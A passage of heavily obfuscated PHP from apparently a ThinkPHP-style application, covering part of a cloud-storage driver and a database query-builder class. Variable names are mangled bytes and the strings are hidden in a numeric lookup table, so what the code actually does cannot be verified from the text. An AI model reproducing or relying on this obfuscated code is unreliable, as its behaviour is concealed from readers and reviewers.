$¬ï„ä¾€, $üíú¬Ÿ¯); if (strpos($íáıŞ—Ç, $˜ïöıØ£[244]) === 0) { if (isset($ØÑÆ‡ı–[$˜ïöıØ£[1488]])) { $ÊÀãƒ…ì = $ØÑÆ‡ı–[$˜ïöıØ£[1488]]; } else { if (isset($Í‹êµ[$˜ïöıØ£[1488]])) { $ÊÀãƒ…ì = $Í‹êµ[$˜ïöıØ£[1488]]; } else { $ÊÀãƒ…ì = hash($˜ïöıØ£[275], $˜ïöıØ£[12]); } } return array($˜ïöıØ£[251] => $Í‹êµ[$˜ïöıØ£[251]], $˜ïöıØ£[1488] => $ÊÀãƒ…ì, $˜ïöıØ£[241] => $Í‹êµ[$˜ïöıØ£[1491]]); } return $Í‹êµ[$˜ïöıØ£[251]]; } public function listUploadParts($’İû€¢à, $ÊøšãıÁ = array()) { $·İ¢·Õ =& $_SERVER[Î‹ÃÂŞ„]; $³ÀçùÉ = str_replace($·İ¢·Õ[252], $·İ¢·Õ[12], $ÊøšãıÁ[$·İ¢·Õ[177]]); $úçÀ·Õœ = $this->client->listParts($this->bucket, $’İû€¢à, $³ÀçùÉ); if (!$úçÀ·Õœ) { return !1; } $¶ãµÄ¾½ = $·İ¢·Õ[1492]; foreach ($úçÀ·Õœ as $¤­„¨Ò‹) { $¶ãµÄ¾½ .= $·İ¢·Õ[1493] . "\74\x50\141\x72\x74\x4e\165\x6d\x62\145\162\76{$¤­„¨Ò‹[$·İ¢·Õ[1449]]}\x3c\x2f\x50\141\x72\164\116\165\x6d\x62\x65\162\x3e\12" . "\74\x45\124\x61\147\x3e{$¤­„¨Ò‹[$·İ¢·Õ[1450]]}\x3c\57\x45\x54\141\x67\x3e\12" . $·İ¢·Õ[1494]; } $¶ãµÄ¾½ .= $·İ¢·Õ[1495]; $‰ª¨€°Ï = array(); $´˜ñ“í§ = explode($·İ¢·Õ[200], $this->getHost()); $Ù¨†ÓÆ’ = array($·İ¢·Õ[1489] => $´˜ñ“í§[1], $·İ¢·Õ[232] => $·İ¢·Õ[122], $·İ¢·Õ[277] => strlen($¶ãµÄ¾½)); $¨°»œë = $·İ¢·Õ[243]; $æá¸Á®Ç = $·İ¢·Õ[8] . $this->pathEncode($’İû€¢à) . $ÊøšãıÁ[$·İ¢·Õ[177]]; $ößåÉêÏ = $this->client->__getSignatureV4($‰ª¨€°Ï, $Ù¨†ÓÆ’, $¨°»œë, $æá¸Á®Ç, $¶ãµÄ¾½); return array($·İ¢·Õ[251] => $ößåÉêÏ[$·İ¢·Õ[251]], $·İ¢·Õ[241] => $ößåÉêÏ[$·İ¢·Õ[1491]], $·İ¢·Õ[253] => $úçÀ·Õœ, $·İ¢·Õ[1488] => $ößåÉêÏ[$·İ¢·Õ[1488]]); } public function link($Á™Ù§¤ğ, $ßÏÙìˆŞ = array()) { return parent::link($Á™Ù§¤ğ, $ßÏÙìˆŞ); } public function fileOut($‰©·æ“ , $•èé“êÎ = false, $ßô½†— = false, $ë«¹µÔØ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Î‹ÃÂŞ„][1496])) { return parent::fileOutServer($‰©·æ“ , $•èé“êÎ, $ßô½†—, $ë«¹µÔØ); } parent::fileOut($‰©·æ“ , $•èé“êÎ, $ßô½†—, $ë«¹µÔØ); } public function fileOutImage($àŞÀï°î, $«…¾õáè = 250) { if (strstr($this->endpoint, $_SERVER[Î‹ÃÂŞ„][1496])) { return parent::fileOutImageServer($àŞÀï°î, $«…¾õáè); } parent::fileOutImage($àŞÀï°î, $«…¾õáè); } public function fileOutLink($”„İ†¸) { $ôÃ·¾¥‘ =& $_SERVER[Î‹ÃÂŞ„]; if (substr($”„İ†¸, 0, 7) == $ôÃ·¾¥‘[1386]) { $”„İ†¸ = $ôÃ·¾¥‘[1387] . substr($”„İ†¸, 7); } header($ôÃ·¾¥‘[164] . $”„İ†¸); die; } public function getHost() { $º‚Áëìø =& $_SERVER[Î‹ÃÂŞ„]; $™á‚å§£ = str_rtrim(parent::getHost(), $º‚Áëìø[8] . $this->bucket); $™á‚å§£ = explode($º‚Áëìø[200], $™á‚å§£); return $™á‚å§£[0] . $º‚Áëìø[200] . $this->bucket . $º‚Áëìø[10] . $™á‚å§£[1]; } } goto c­¶ÉçáÓ; Aöá¿Œ¹À: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\x69\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\75", "\156\145\x71" => "\74\76", "\x67\x74" => "\x3e", "\145\x67\x74" => "\76\x3d", "\x6c\164" => "\x3c", "\x65\x6c\x74" => "\x3c\x3d", "\x6e\x6f\164\154\x69\x6b\145" => "\x4e\x4f\124\40\x4c\111\x4b\x45", "\x6c\151\x6b\145" => "\114\111\x4b\105", "\151\x6e" => "\x49\x4e", "\156\x6f\x74\x69\x6e" => "\x4e\x4f\x54\40\x49\x4e", "\156\x6f\x74\40\151\156" => "\116\x4f\x54\40\x49\x4e", "\142\x65\x74\x77\145\x65\156" => "\x42\x45\x54\127\105\x45\116", "\156\157\x74\142\145\164\167\x65\x65\156" => "\116\x4f\x54\x20\x42\105\x54\127\x45\x45\x4e", "\x6e\x6f\164\x20\x62\x65\x74\x77\x65\145\x6e" => "\116\x4f\x54\x20\x42\105\124\127\105\x45\x4e"); protected $selectSql = "\123\x45\114\105\103\124\x25\x44\x49\123\x54\x49\116\103\124\x25\40\x25\x46\111\x45\114\x44\45\x20\106\x52\x4f\x4d\x20\x25\124\x41\x42\x4c\x45\45\x25\x4a\x4f\111\x4e\x25\x25\x57\x48\x45\122\x45\45\x25\107\x52\117\x55\120\45\x25\x48\x41\126\111\x4e\x47\x25\45\117\122\x44\x45\x52\x25\45\x4c\x49\x4d\111\124\45\x20\45\125\x4e\111\x4f\116\45\45\103\117\115\x4d\x45\x4e\124\x25"; protected $bind = array(); public static function getInstance() { $‡÷í¯¡§ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Î‹ÃÂŞ„][1015], $‡÷í¯¡§); } public function factory($¤¯­­Şü = '') { $´»õÏªÓ =& $_SERVER[Î‹ÃÂŞ„]; $¤¯­­Şü = $this->parseConfig($¤¯­­Şü); if (empty($¤¯­­Şü[$´»õÏªÓ[1016]])) { think_exception(think_lang($´»õÏªÓ[1017])); } $this->dbType = ucwords(strtolower($¤¯­­Şü[$´»õÏªÓ[1016]])); $¿’Ù©ÏÕ = $´»õÏªÓ[1018] . $this->dbType; if (class_exists($¿’Ù©ÏÕ)) { $ôÃ¾ê« = new $¿’Ù©ÏÕ($¤¯­­Şü); if ($´»õÏªÓ[1019] != strtolower($¤¯­­Şü[$´»õÏªÓ[1016]])) { $ôÃ¾ê«->dbType = strtoupper($this->dbType); } else { $ôÃ¾ê«->dbType = $this->_getDsnType($¤¯­­Şü[$´»õÏªÓ[970]]); } } else { think_exception(think_lang($´»õÏªÓ[1020]) . $´»õÏªÓ[1021] . $¿’Ù©ÏÕ); } return $ôÃ¾ê«; } public function __call($œøöÒ², $µ°±ÇŞ) { if (method_exists($this, $œøöÒ²)) { return call_user_func_array(array($this, $œøöÒ²), $µ°±ÇŞ); } } protected function _getDsnType($Ê“ïı¢·) { $»Í„í¿Ã = explode($_SERVER[Î‹ÃÂŞ„][4], $Ê“ïı¢·); $ƒ€å©àß = strtoupper(trim($»Í„í¿Ã[0])); return $ƒ€å©àß; } private function parseConfig($¶·õÏ‡ = '') { $Ğ´§áä =& $_SERVER[Î‹ÃÂŞ„]; if (!empty($¶·õÏ‡) && is_string($¶·õÏ‡)) { $¶·õÏ‡ = $this->parseDSN($¶·õÏ‡); } elseif (is_array($¶·õÏ‡)) { $¶·õÏ‡ = array_change_key_case($¶·õÏ‡); $¶·õÏ‡ = array($Ğ´§áä[1016] => $¶·õÏ‡[$Ğ´§áä[1022]], $Ğ´§áä[942] => $¶·õÏ‡[$Ğ´§áä[1023]], $Ğ´§áä[943] => $¶·õÏ‡[$Ğ´§áä[1024]], $Ğ´§áä[940] => $¶·õÏ‡[$Ğ´§áä[1025]], $Ğ´§áä[941] => $¶·õÏ‡[$Ğ´§áä[1026]], $Ğ´§áä[21] => $¶·õÏ‡[$Ğ´§áä[1027]], $Ğ´§áä[970] => $¶·õÏ‡[$Ğ´§áä[1028]], $Ğ´§áä[17] => isset($¶·õÏ‡[$Ğ´§áä[1029]]) ? $¶·õÏ‡[$Ğ´§áä[1029]] : array()); } elseif (empty($¶·õÏ‡)) { if (think_config($Ğ´§áä[1030]) && $Ğ´§áä[1019] != strtolower(think_config($Ğ´§áä[1031]))) { $¶·õÏ‡ = $this->parseDSN(think_config($Ğ´§áä[1030])); } else { $¶·õÏ‡ = array($Ğ´§áä[1016] => think_config($Ğ´§áä[1031]), $Ğ´§áä[942] => think_config($Ğ´§áä[1032]), $Ğ´§áä[943] => think_config($Ğ´§áä[1033]), $Ğ´§áä[940] => think_config($Ğ´§áä[1034]), $Ğ´§áä[941] => think_config($Ğ´§áä[1035]), $Ğ´§áä[21] => think_config($Ğ´§áä[292]), $Ğ´§áä[970] => think_config($Ğ´§áä[1030]), $Ğ´§áä[17] => think_config($Ğ´§áä[1036])); } } return $¶·õÏ‡; } protected function initConnect($ÉİËŠÕ = true) { if (1 == think_config($_SERVER[Î‹ÃÂŞ„][22])) { $this->_linkID = $this->multiConnect($ÉİËŠÕ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $Ö«‰£‰ => $‹ÁÕ¹ò) { $this->_linkID = $‹ÁÕ¹ò; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ ÔÏ‰¤· = false) { $”ø´ÉŸ =& $_SERVER[Î‹ÃÂŞ„]; static $Å¾Öüİ = array(); static $Áª˜ŠüÄ = -1; if (empty($Å¾Öüİ)) { foreach ($this->config as $ñöºï©ô => $Ì±ëƒ•) { $Å¾Öüİ[$ñöºï©ô] = explode($”ø´ÉŸ[50], $Ì±ëƒ•); } } if (think_config($”ø´ÉŸ[1037])) { if ($ ÔÏ‰¤· || think_config($”ø´ÉŸ[441]) === !0) { $ƒùÊäÍ = floor(mt_rand(0, think_config($”ø´ÉŸ[1038]) - 1)); $Áª˜ŠüÄ = $ƒùÊäÍ; } else { if (is_numeric(think_config($”ø´ÉŸ[1039]))) { $ƒùÊäÍ = think_config($”ø´ÉŸ[1039]); } else { $ƒùÊäÍ = floor(mt_rand(think_config($”ø´ÉŸ[1038]), count($Å¾Öüİ[$”ø´ÉŸ[940]]) - 1)); } } } else { $ƒùÊäÍ = floor(mt_rand(0, count($Å¾Öüİ[$”ø´ÉŸ[940]]) - 1)); $Áª˜ŠüÄ = $ƒùÊäÍ; } $ƒùÊäÍ = $Áª˜ŠüÄ !== -1 ? $Áª˜ŠüÄ : $ƒùÊäÍ; $´×ßå¡” = array($”ø´ÉŸ[942] => isset($Å¾Öüİ[$”ø´ÉŸ[942]][$ƒùÊäÍ]) ? $Å¾Öüİ[$”ø´ÉŸ[942]][$ƒùÊäÍ] : $Å¾Öüİ[$”ø´ÉŸ[942]][0], $”ø´ÉŸ[943] => isset($Å¾Öüİ[$”ø´ÉŸ[943]][$ƒùÊäÍ]) ? $Å¾Öüİ[$”ø´ÉŸ[943]][$ƒùÊäÍ] : $Å¾Öüİ[$”ø´ÉŸ[943]][0], $”ø´ÉŸ[940] => isset($Å¾Öüİ[$”ø´ÉŸ[940]][$ƒùÊäÍ]) ? $Å¾Öüİ[$”ø´ÉŸ[940]][$ƒùÊäÍ] : $Å¾Öüİ[$”ø´ÉŸ[940]][0], $”ø´ÉŸ[941] => isset($Å¾Öüİ[$”ø´ÉŸ[941]][$ƒùÊäÍ]) ? $Å¾Öüİ[$”ø´ÉŸ[941]][$ƒùÊäÍ] : $Å¾Öüİ[$”ø´ÉŸ[941]][0], $”ø´ÉŸ[21] => isset($Å¾Öüİ[$”ø´ÉŸ[21]][$ƒùÊäÍ]) ? $Å¾Öüİ[$”ø´ÉŸ[21]][$ƒùÊäÍ] : $Å¾Öüİ[$”ø´ÉŸ[21]][0], $”ø´ÉŸ[970] => isset($Å¾Öüİ[$”ø´ÉŸ[970]][$ƒùÊäÍ]) ? $Å¾Öüİ[$”ø´ÉŸ[970]][$ƒùÊäÍ] : $Å¾Öüİ[$”ø´ÉŸ[970]][0], $”ø´ÉŸ[17] => isset($Å¾Öüİ[$”ø´ÉŸ[17]][$ƒùÊäÍ]) ? $Å¾Öüİ[$”ø´ÉŸ[17]][$ƒùÊäÍ] : $Å¾Öüİ[$”ø´ÉŸ[17]][0]); return $this->connect($´×ßå¡”, $ƒùÊäÍ); } public function parseDSN($ğòÌäºÙ) { $ò ›ç•» =& $_SERVER[Î‹ÃÂŞ„]; if (empty($ğòÌäºÙ)) { return !1; } $èÁˆÆâô = parse_url($ğòÌäºÙ); if ($èÁˆÆâô[$ò ›ç•»[197]]) { $Éİ¢Ö®® = array($ò ›ç•»[1016] => $èÁˆÆâô[$ò ›ç•»[197]], $ò ›ç•»[942] => isset($èÁˆÆâô[$ò ›ç•»[633]]) ? $èÁˆÆâô[$ò ›ç•»[633]] : $ò ›ç•»[12], $ò ›ç•»[943] => isset($èÁˆÆâô[$ò ›ç•»[1040]]) ? $èÁˆÆâô[$ò ›ç•»[1040]] : $ò ›ç•»[12], $ò ›ç•»[940] => isset($èÁˆÆâô[$ò ›ç•»[198]]) ? $èÁˆÆâô[$ò ›ç•»[198]] : $ò ›ç•»[12], $ò ›ç•»[941] => isset($èÁˆÆâô[$ò ›ç•»[199]]) ? $èÁˆÆâô[$ò ›ç•»[199]] : $ò ›ç•»[12], $ò ›ç•»[21] => isset($èÁˆÆâô[$ò ›ç•»[86]]) ? substr($èÁˆÆâô[$ò ›ç•»[86]], 1) : $ò ›ç•»[12]); } else { preg_match($ò ›ç•»[1041], trim($ğòÌäºÙ), $«—Ï¸æ†); $Éİ¢Ö®® = array($ò ›ç•»[1016] => $«—Ï¸æ†[1], $ò ›ç•»[942] => $«—Ï¸æ†[2], $ò ›ç•»[943] => $«—Ï¸æ†[3], $ò ›ç•»[940] => $«—Ï¸æ†[4], $ò ›ç•»[941] => $«—Ï¸æ†[5], $ò ›ç•»[21] => $«—Ï¸æ†[6]); } $Éİ¢Ö®®[$ò ›ç•»[970]] = $ò ›ç•»[12]; return $Éİ¢Ö®®; } protected function debug() { $Ğİ’Òè³ =& $_SERVER[Î‹ÃÂŞ„]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Ğİ’Òè³[1042]; if (think_config($Ğİ’Òè³[1043])) { think_status($Ğİ’Òè³[1044]); think_trace($this->queryStr . $Ğİ’Òè³[1045] . think_status($Ğİ’Òè³[24], $Ğİ’Òè³[1044], 6) . $Ğİ’Òè³[1046], $Ğİ’Òè³[12], $Ğİ’Òè³[1047]); } } protected function parseLock($«±ûÙĞÏ = false) { $òÜ°•šä =& $_SERVER[Î‹ÃÂŞ„]; if (!$«±ûÙĞÏ) { return $òÜ°•šä[12]; } if ($òÜ°•šä[972] == $this->dbType) { return $òÜ°•šä[1048]; } return $òÜ°•šä[1049]; } protected function parseSet($ù¨¡¤) { $… ÚÄ€© =& $_SERVER[Î‹ÃÂŞ„]; foreach ($ù¨¡¤ as $Ğı¸ƒ€¢ => $¼ŠÎ¼Ô) { if (is_array($¼ŠÎ¼Ô) && $… ÚÄ€©[343] == $¼ŠÎ¼Ô[0]) { $‡œ‰š¹È[] = $this->parseKey($Ğı¸ƒ€¢) . $… ÚÄ€©[938] . $¼ŠÎ¼Ô[1]; } elseif (is_scalar($¼ŠÎ¼Ô) || is_null($¼ŠÎ¼Ô)) { $‡œ‰š¹È[] = $this->parseKey($Ğı¸ƒ€¢) . $… ÚÄ€©[938] . $this->parseValue($¼ŠÎ¼Ô); } } return $… ÚÄ€©[1050] . implode($… ÚÄ€©[50], $‡œ‰š¹È); } protected function bindParam($ùÎ·¶Å, $àêõ”ù¬) { $this->bind[$_SERVER[Î‹ÃÂŞ„][4] . $ùÎ·¶Å] = $àêõ”ù¬; } protected function parseBind($ÂÊ§ŞïÁ) { $ÂÊ§ŞïÁ = array_merge($this->bind, $ÂÊ§ŞïÁ); $this->bind = array(); return $ÂÊ§ŞïÁ; } function parseKey(&$î˜å×Œ, $ÁÜ¥ŒåÉ = true) { if ($ÁÜ¥ŒåÉ) { $î˜å×Œ = $this->parseKeyCheck($î˜å×Œ); } return $î˜å×Œ; } function parseKeyCheck($áŒ¸Ïù¡) { $–œ³§‡ =& $_SERVER[Î‹ÃÂŞ„]; $áŒ¸Ïù¡ = trim($áŒ¸Ïù¡); if (!preg_match($–œ³§‡[1051], $áŒ¸Ïù¡)) { think_exception($–œ³§‡[1052] . $áŒ¸Ïù¡); } return $áŒ¸Ïù¡; } protected function parseValue($âİ‚Ù‘Â) { $³ôá¡®ï =& $_SERVER[Î‹ÃÂŞ„]; if (is_string($âİ‚Ù‘Â)) { $âİ‚Ù‘Â = $³ôá¡®ï[1011] . $this->escapeString($âİ‚Ù‘Â) . $³ôá¡®ï[1011]; } elseif (isset($âİ‚Ù‘Â[0]) && is_string($âİ‚Ù‘Â[0]) && strtolower($âİ‚Ù‘Â[0]) == $³ôá¡®ï[343]) { $âİ‚Ù‘Â = $this->escapeString($âİ‚Ù‘Â[1]); } elseif (is_array($âİ‚Ù‘Â)) { $âİ‚Ù‘Â = array_map(array($this, $³ôá¡®ï[1012]), $âİ‚Ù‘Â); } elseif (is_bool($âİ‚Ù‘Â)) { $âİ‚Ù‘Â = $âİ‚Ù‘Â ? $³ôá¡®ï[90] : $³ôá¡®ï[214]; } elseif (is_null($âİ‚Ù‘Â)) { $âİ‚Ù‘Â = $³ôá¡®ï[105]; } return $âİ‚Ù‘Â; } protected function parseField($ÈÑ•†ÆŒ) { $ßöÀÄ”Ø =& $_SERVER[Î‹ÃÂŞ„]; if (is_string($ÈÑ•†ÆŒ) && strpos($ÈÑ•†ÆŒ, $ßöÀÄ”Ø[50])) { $ÈÑ•†ÆŒ = explode($ßöÀÄ”Ø[50], $ÈÑ•†ÆŒ); } if (is_array($ÈÑ•†ÆŒ)) { $õÆÇĞ¬Ş = array(); foreach ($ÈÑ•†ÆŒ as $¬±ºÊá² => $è½ãö¢´) { if (!is_numeric($¬±ºÊá²)) { $õÆÇĞ¬Ş[] = $this->parseKey($¬±ºÊá², !1) . $ßöÀÄ”Ø[1053] . $this->parseKey($è½ãö¢´); } else { $õÆÇĞ¬Ş[] = $this->parseKey($è½ãö¢´); } } $µ—ê«Ò¢ = implode($ßöÀÄ”Ø[50], $õÆÇĞ¬Ş); } elseif (is_string($ÈÑ•†ÆŒ) && !empty($ÈÑ•†ÆŒ)) { $µ—ê«Ò¢ = $ÈÑ•†ÆŒ; } else { $µ—ê«Ò¢ = $ßöÀÄ”Ø[205]; } return $µ—ê«Ò¢; } protected function parseTable($ù¿‰Ş²ˆ) { $¡ƒú‘í =& $_SERVER[Î‹ÃÂŞ„]; if (is_array($ù¿‰Ş²ˆ)) { $šòÜº° = array(); foreach ($ù¿‰Ş²ˆ as $èÂ—„Á– => $±ÁËâ¥) { if (!is_numeric($èÂ—„Á–)) { $šòÜº°[] = $this->parseKey($èÂ—„Á–) . $¡ƒú‘í[53] . $this->parseKey($±ÁËâ¥); } else { $šòÜº°[] = $this->parseKey($èÂ—„Á–); } } $ù¿‰Ş²ˆ = $šòÜº°; } elseif (is_string($ù¿‰Ş²ˆ)) { if (strstr($ù¿‰Ş²ˆ, $¡ƒú‘í[53])) { return $ù¿‰Ş²ˆ; } $ù¿‰Ş²ˆ = explode($¡ƒú‘í[50], $ù¿‰Ş²ˆ); array_walk($ù¿‰Ş²ˆ, array($this, $¡ƒú‘í[960])); } return $¡ƒú‘í[954] . trim(implode($¡ƒú‘í[1054], $ù¿‰Ş²ˆ), $¡ƒú‘í[431]) . $¡ƒú‘í[954]; } protected function parseWhere($‘ËÓŠ…é) { $œ€€ËÓÇ =& $_SERVER[Î‹ÃÂŞ„]; $Ì§¨Æ– = $œ€€ËÓÇ[12]; if (is_string($‘ËÓŠ…é)) { $Ì§¨Æ– = $‘ËÓŠ…é; } else { $ËÔÈÍŠ° = isset($‘ËÓŠ…é[$œ€€ËÓÇ[1055]]) ? strtoupper($‘ËÓŠ…é[$œ€€ËÓÇ[1055]]) : $œ€€ËÓÇ[12]; if (in_array($ËÔÈÍŠ°, array($œ€€ËÓÇ[1056], $œ€€ËÓÇ[1057], $œ€€ËÓÇ[1058]))) { $ËÔÈÍŠ° = $œ€€ËÓÇ[53] . $ËÔÈÍŠ° . $œ€€ËÓÇ[53]; unset($‘ËÓŠ…é[$œ€€ËÓÇ[1055]]); } else { $ËÔÈÍŠ° = $œ€€ËÓÇ[1059]; } foreach ($‘ËÓŠ…é as $ãâ‹Úí => $‚ï®ğùË) { $Ì§¨Æ– .= $œ€€ËÓÇ[323]; if (is_numeric($ãâ‹Úí)) { $ãâ‹Úí = $œ€€ËÓÇ[1060]; } if (0 === strpos($ãâ‹Úí, $œ€€ËÓÇ[11])) { $Ì§¨Æ– .= $this->parseThinkWhere($ãâ‹Úí, $‚ï®ğùË); } else { if (!preg_match($œ€€ËÓÇ[1061], trim($ãâ‹Úí))) { think_exception(think_lang($œ€€ËÓÇ[1062]) . $œ€€ËÓÇ[4] . $ãâ‹Úí); } $Û¤„ı½ = is_array($‚ï®ğùË) && isset($‚ï®ğùË[$œ€€ËÓÇ[1063]]); $ãâ‹Úí = trim($ãâ‹Úí); if (strpos($ãâ‹Úí, $œ€€ËÓÇ[329])) { $Êìß—è‰ = explode($œ€€ËÓÇ[329], $ãâ‹Úí); $åÅˆ’ŠĞ = array(); foreach ($Êìß—è‰ as $¦Êî³ => $‰øÖğÀœ) { $œˆ—â§ã = $Û¤„ı½ ? $‚ï®ğùË[$¦Êî³] : $‚ï®ğùË; $åÅˆ’ŠĞ[] = $œ€€ËÓÇ[306] . $this->parseWhereItem($this->parseKey($‰øÖğÀœ), $œˆ—â§ã) . $œ€€ËÓÇ[959]; } $Ì§¨Æ– .= implode($œ€€ËÓÇ[1064], $åÅˆ’ŠĞ); } elseif (strpos($ãâ‹Úí, $œ€€ËÓÇ[330])) { $Êìß—è‰ = explode($œ€€ËÓÇ[330], $ãâ‹Úí); $åÅˆ’ŠĞ = array(); foreach ($Êìß—è‰ as $¦Êî³ => $‰øÖğÀœ) { $œˆ—â§ã = $Û¤„ı½ ? $‚ï®ğùË[$¦Êî³] : $‚ï®ğùË; $åÅˆ’ŠĞ[] = $œ€€ËÓÇ[306] . $this->parseWhereItem($this->parseKey($‰øÖğÀœ), $œˆ—â§ã) . $œ€€ËÓÇ[959]; } $Ì§¨Æ– .= implode($œ€€ËÓÇ[1059], $åÅˆ’ŠĞ); } else { $Ì§¨Æ– .= $this->parseWhereItem($this->parseKey($ãâ‹Úí), $‚ï®ğùË); } } $Ì§¨Æ– .= $œ€€ËÓÇ[324] . $ËÔÈÍŠ°; } $Ì§¨Æ– = substr($Ì§¨Æ–, 0, -strlen($ËÔÈÍŠ°)); } return empty($Ì§¨Æ–) ? $œ€€ËÓÇ[12] : $œ€€ËÓÇ[1065] . $Ì§¨Æ–; } protected function parseWhereItem($Ÿ›‡Â†À, $‰ü¼çş) { $Û°á¶ñô =& $_SERVER[Î‹ÃÂŞ„]; $üÁİ¬·¯ = $Û°á¶ñô[12]; if (is_array($‰ü¼çş)) { if (is_string($‰ü¼çş[0])) { $ÍÕğèˆÉ = strtolower($‰ü¼çş[0]); if (in_array($‰ü¼çş[0], array($Û°á¶ñô[938], $Û°á¶ñô[1066], $Û°á¶ñô[1067], $Û°á¶ñô[1068], $Û°á¶ñô[1069], $Û°á¶ñô[1070]))) { $üÁİ¬·¯ .= $Ÿ›‡Â†À . $Û°á¶ñô[53] . $‰ü¼çş[0] . $Û°á¶ñô[53] . $this->parseValue($‰ü¼çş[1]); } elseif (preg_match($Û°á¶ñô[1071], $‰ü¼çş[0])) { $üÁİ¬·¯ .= $Ÿ›‡Â†À . $Û°á¶ñô[53] . $this->exp[$ÍÕğèˆÉ] . $Û°á¶ñô[53] . $this->parseValue($‰ü¼çş[1]); } elseif (preg_match($Û°á¶ñô[1072], $‰ü¼çş[0])) { if (is_array($‰ü¼çş[1])) { $¹ã¿ËÏ = isset($‰ü¼çş[2]) ? strtoupper($‰ü¼çş[2]) : $Û°á¶ñô[1057]; if (in_array($¹ã¿ËÏ, array($Û°á¶ñô[1056], $Û°á¶ñô[1057], $Û°á¶ñô[1058]))) { $†èºüÙë = array(); foreach ($‰ü¼çş[1] as $Ã‘âÄ½÷) { $†èºüÙë[] = $Ÿ›‡Â†À . $Û°á¶ñô[53] . $this->exp[$ÍÕğèˆÉ] . $Û°á¶ñô[53] . $this->parseValue($Ã‘âÄ½÷); } $üÁİ¬·¯ .= $Û°á¶ñô[306] . implode($Û°á¶ñô[53] . $¹ã¿ËÏ . $Û°á¶ñô[53], $†èºüÙë) . $Û°á¶ñô[959]; } } else { $üÁİ¬·¯ .= $Ÿ›‡Â†À . $Û°á¶ñô[53] . $this->exp[$ÍÕğèˆÉ] . $Û°á¶ñô[53] . $this->parseValue($‰ü¼çş[1]); } } elseif ($Û°á¶ñô[343] == $ÍÕğèˆÉ) { $üÁİ¬·¯ .= $Û°á¶ñô[957] . $Ÿ›‡Â†À . $Û°á¶ñô[53] . $‰ü¼çş[1] . $Û°á¶ñô[1073]; } elseif (preg_match($Û°á¶ñô[1074], $‰ü¼çş[0])) { $üÁİ¬·¯ .= $‰ü¼çş[0]; } elseif (preg_match($Û°á¶ñô[1075], $‰ü¼çş[0])) { if (isset($‰ü¼çş[2]) && $Û°á¶ñô[343] == $‰ü¼çş[2]) { $üÁİ¬·¯ .= $Ÿ›‡Â†À . $Û°á¶ñô[53] . $this->exp[$ÍÕğèˆÉ] . $Û°á¶ñô[53] . $‰ü¼çş[1]; } else { if (is_string($‰ü¼çş[1])) { $‰ü¼çş[1] = explode($Û°á¶ñô[50], $‰ü¼çş[1]); } $›£’ÏêÍ = implode($Û°á¶ñô[50], $this->parseValue($‰ü¼çş[1])); $üÁİ¬·¯ .= $Ÿ›‡Â†À . $Û°á¶ñô[53] . $this->exp[$ÍÕğèˆÉ] . $Û°á¶ñô[957] . $›£’ÏêÍ . $Û°á¶ñô[959]; } } elseif (preg_match($Û°á¶ñô[1076], $‰ü¼çş[0])) { $Õ™ÃÄ• = is_string($‰ü¼çş[1]) ? explode($Û°á¶ñô[50], $‰ü¼çş[1]) : $‰ü¼çş[1]; $üÁİ¬·¯ .= $Û°á¶ñô[957] . $Ÿ›‡Â†À . $Û°á¶ñô[53] . $this->exp[$ÍÕğèˆÉ] . $Û°á¶ñô[53] . $this->parseValue($Õ™ÃÄ•[0]) . $Û°á¶ñô[1059] . $this->parseValue($Õ™ÃÄ•[1]) . $Û°á¶ñô[324]; } else { think_exception(think_lang($Û°á¶ñô[1062]) . $Û°á¶ñô[4] . $‰ü¼çş[0]); } } else { $é¨™Î€½ = count($‰ü¼çş); $ÜãÔñ¢› = $Û°á¶ñô[12]; if (is_string($‰ü¼çş[$é¨™Î€½ - 1])) { $ÜãÔñ¢› = isset($‰ü¼çş[$é¨™Î€½ - 1]) ? strtoupper($‰ü¼çş[$é¨™Î€½ - 1]) : $Û°á¶ñô[12]; if (in_array($ÜãÔñ¢›, array($Û°á¶ñô[1056], $Û°á¶ñô[1057], $Û°á¶ñô[1058]))) { $é¨™Î€½ = $é¨™Î€½ - 1; } } else { $ÜãÔñ¢› = $Û°á¶ñô[1056]; } for ($¹“¡éÌâ = 0; $¹“¡éÌâ < $é¨™Î€½; $¹“¡éÌâ++) { $Õ™ÃÄ• = is_array($‰ü¼çş[$¹“¡éÌâ]) ? $‰ü¼çş[$¹“¡éÌâ][1] : $‰ü¼çş[$¹“¡éÌâ]; if ($Û°á¶ñô[343] == strtolower($‰ü¼çş[$¹“¡éÌâ][0])) { $üÁİ¬·¯ .= $Û°á¶ñô[306] . $Ÿ›‡Â†À . $Û°á¶ñô[53] . $Õ™ÃÄ• . $Û°á¶ñô[1073] . $ÜãÔñ¢› . $Û°á¶ñô[53]; } else { $‘¬şì¯² = is_array($‰ü¼çş[$¹“¡éÌâ]) ? $this->exp[strtolower($‰ü¼çş[$¹“¡éÌâ][0])] : $Û°á¶ñô[938]; if (!$‘¬şì¯² && is_array($‰ü¼çş[$¹“¡éÌâ]) && in_array($‰ü¼çş[$¹“¡éÌâ][0], array($Û°á¶ñô[938], $Û°á¶ñô[1066], $Û°á¶ñô[1067], $Û°á¶ñô[1068], $Û°á¶ñô[1069], $Û°á¶ñô[1070]))) { $‘¬şì¯² = $‰ü¼çş[$¹“¡éÌâ][0]; } $üÁİ¬·¯ .= $Û°á¶ñô[306] . $Ÿ›‡Â†À . $Û°á¶ñô[53] . $‘¬şì¯² . $Û°á¶ñô[53] . $this->parseValue($Õ™ÃÄ•) . $Û°á¶ñô[1073] . $ÜãÔñ¢› . $Û°á¶ñô[53]; } } $üÁİ¬·¯ = substr($üÁİ¬·¯, 0, -4); } } else { $üÁİ¬·¯ .= $Ÿ›‡Â†À . $Û°á¶ñô[1077] . $this->parseValue($‰ü¼çş); } return $üÁİ¬·¯; } protected function parseThinkWhere($œ£€½Şî, $Œ¡¿®®Ï) { $µÑÓâäÅ =& 